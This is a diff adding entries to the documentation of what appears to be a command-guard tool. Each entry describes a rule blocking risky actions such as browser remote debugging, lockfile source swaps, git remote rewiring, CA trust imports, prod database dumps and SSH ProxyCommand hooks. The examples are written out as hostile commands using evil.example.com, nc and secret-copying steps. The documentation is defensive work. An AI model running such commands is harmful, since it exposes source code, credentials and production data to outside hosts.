@@ -262,6 +262,86 @@ This page is the plain-English deep dive for every implemented guard.
 - Example: `tests/login.test.ts xdescribe(`
 - Action: warn
 
+## browser-remote-debug-guard
+
+- Purpose: stop browser launches that expose a live profile over remote debugging.
+- Detects: Chrome, Chromium, and Edge launches with `--remote-debugging-port` or `--remote-debugging-pipe`.
+- Why it matters: remote debugging can hand a local process direct control over authenticated browser state.
+- Example: `google-chrome --remote-debugging-port=9222`
+- Action: block
+
+## package-lock-source-swap-guard
+
+- Purpose: surface lockfile or package source changes that repoint dependency resolution.
+- Detects: lockfiles and package source config that reference unreviewed registries or raw artifact hosts.
+- Why it matters: source swaps are a quiet supply-chain pivot that can bypass normal dependency expectations.
+- Example: `package-lock.json resolved https://evil.example.com/pkg.tgz`
+- Action: prompt
+
+## package-manager-auth-inline-guard
+
+- Purpose: stop live registry credentials from being written into package-manager config.
+- Detects: auth tokens, passwords, and private keys written into `.npmrc`, `.yarnrc.yml`, `.pypirc`, and similar files.
+- Why it matters: these files are easy to leak into repos, build logs, or artifacts.
+- Example: `.npmrc //registry.npmjs.org/:_authToken=ghp_...`
+- Action: block
+
+## git-remote-rewire-guard
+
+- Purpose: pause git remote changes that move code or credentials to an unreviewed host.
+- Detects: `git remote add`, `git remote set-url`, and direct git push URLs outside the approved forge list.
+- Why it matters: a remote rewire silently changes where source code and auth material flow.
+- Example: `git remote set-url origin https://evil.example.com/repo.git`
+- Action: prompt
+
+## ci-self-hosted-runner-guard
+
+- Purpose: stop PR-triggered workflows from landing on self-hosted runners.
+- Detects: workflow changes that combine `runs-on: self-hosted` with `pull_request` or `pull_request_target`.
+- Why it matters: untrusted code on a self-hosted runner can reach internal network paths, credentials, and build systems.
+- Example: `.github/workflows/ci.yml runs-on: [self-hosted, linux] on: pull_request_target`
+- Action: block
+
+## local-ca-trust-guard
+
+- Purpose: require review before changing the machine trust store.
+- Detects: `security add-trusted-cert`, `update-ca-certificates`, `certutil -A`, and similar trust-anchor import flows.
+- Why it matters: a new trusted root can silently legitimize interception or malicious TLS endpoints.
+- Example: `security add-trusted-cert -d -r trustRoot evil-ca.pem`
+- Action: prompt
+
+## kube-exec-prod-guard
+
+- Purpose: stop direct interactive access into production-like Kubernetes workloads.
+- Detects: `kubectl exec`, `attach`, or `debug` against prod-like contexts, namespaces, or targets.
+- Why it matters: an interactive shell inside a live workload is a high-risk break-glass action.
+- Example: `kubectl --context prod exec -it deploy/api -- sh`
+- Action: block
+
+## prod-db-dump-guard
+
+- Purpose: stop dump and export commands against production-like data stores.
+- Detects: `pg_dump`, `mysqldump`, `mongodump`, and `redis-cli --rdb` against prod-like hosts or databases.
+- Why it matters: dumps turn live data into portable files very quickly.
+- Example: `pg_dump --host prod-db.internal --dbname billing`
+- Action: block
+
+## public-artifact-secret-guard
+
+- Purpose: stop secret-bearing files from being copied into distributable directories.
+- Detects: copy, move, sync, and archive commands that move `.env`, key material, or credential files into `dist`, `public`, `build`, `release`, or similar paths.
+- Why it matters: a secret inside a build or public artifact is usually one step away from being shipped.
+- Example: `cp .env dist/.env`
+- Action: block
+
+## ssh-proxycommand-guard
+
+- Purpose: block SSH config command hooks that execute or proxy side effects.
+- Detects: `ProxyCommand`, `LocalCommand`, `PermitLocalCommand yes`, and equivalent `ssh -o` usage.
+- Why it matters: SSH command hooks create covert execution and traffic-redirection surfaces that are easy to miss in review.
+- Example: `ssh -o ProxyCommand='nc evil.example.com 443' host`
+- Action: block
+
 ## remote-script-dropper-guard
 
 - Purpose: stop remote content from being staged as a local script.
